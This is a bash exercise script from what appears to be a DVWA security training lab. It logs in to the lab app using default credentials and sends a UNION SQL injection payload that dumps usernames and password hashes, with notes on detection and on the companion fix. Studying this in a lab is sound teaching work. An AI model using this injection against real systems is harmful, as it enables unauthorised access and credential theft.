#!/usr/bin/env bash
# Run this ON kali (vagrant ssh kali) once enable-vulnerability.sh has run
# on target. Logs in to the hidden DVWA app fresh (so it always picks up
# target's current default security level, not a stale cookie from an
# earlier run) and feeds its SQL Injection page a classic UNION payload
# that dumps the whole users table straight out of the database - no
# tool beyond curl. See exercises/02-dvwa-sqli/README.md for the full
# exercise, including why this one gets caught by Suricata instead of
# the file-integrity/log-volume detections the other two exercises use.
set -euo pipefail
TARGET=10.10.20.10
BASE="http://${TARGET}/legacy"
JAR=$(mktemp)
trap 'rm -f "$JAR"' EXIT

echo "[1/3] Logging in fresh as admin/password"
TOKEN=$(curl -s -c "$JAR" "${BASE}/login.php" | grep -o "user_token' value='[^']*'" | sed "s/.*value='//;s/'//")
curl -s -b "$JAR" -c "$JAR" -o /dev/null -L -X POST "${BASE}/login.php" \
    -d "username=admin&password=password&Login=Login&user_token=${TOKEN}"

echo
echo "[2/3] SQL injection: dumping the users table via a UNION payload"
PAYLOAD="1' UNION SELECT user, password FROM users-- -"
ROWS=$(curl -s -G "${BASE}/vulnerabilities/sqli/" -b "$JAR" \
    --data-urlencode "id=${PAYLOAD}" --data-urlencode "Submit=Submit" \
    | grep -o '<pre>ID:[^<]*<br />[^<]*<br />[^<]*</pre>' \
    | sed -E 's/<pre>//; s/<\/pre>//; s/<br \/>/, /g' || true)

echo
if [ -n "$ROWS" ]; then
    echo "$ROWS"
    echo
    echo "[3/3] Done. Every row above came straight out of the 'users' table -"
    echo "the second column is the user's password hash. At target's default"
    echo "('low') security level, the id parameter is pasted directly into the"
    echo "SQL query with no checks at all; exercises/02-dvwa-sqli/fix.sh changes"
    echo "that to 'high', which defeats this exact payload."
else
    echo "[3/3] No rows came back - the payload didn't work. If"
    echo "exercises/02-dvwa-sqli/fix.sh has already run on target, that's"
    echo "expected: 'high' security defeats this exact UNION payload."
fi
